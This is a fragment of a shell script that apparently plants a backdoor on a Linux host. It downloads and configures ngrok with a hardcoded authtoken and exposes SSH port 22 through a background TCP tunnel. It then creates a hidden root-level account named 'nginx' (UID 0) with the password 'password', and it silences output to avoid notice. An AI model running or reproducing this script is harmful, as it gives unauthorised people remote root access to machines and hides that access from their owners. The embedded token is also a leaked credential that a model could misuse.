...
rm -rf ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
./ngrok config add-authtoken 2LxBcxZfYHwCj66xfFI8G9xoS0R_3A5e12MzVHy5SQkBqpQae > /dev/null 2>&1
mv ngrok /usr/sbin
ngrok tcp 22 --log=stdout > ngrok.log &
useradd nginx -o -u 0 -g 0 > /dev/null 2>&1
echo -e "password\npassword" | passwd nginx > /dev/null 2>&1
stty echo
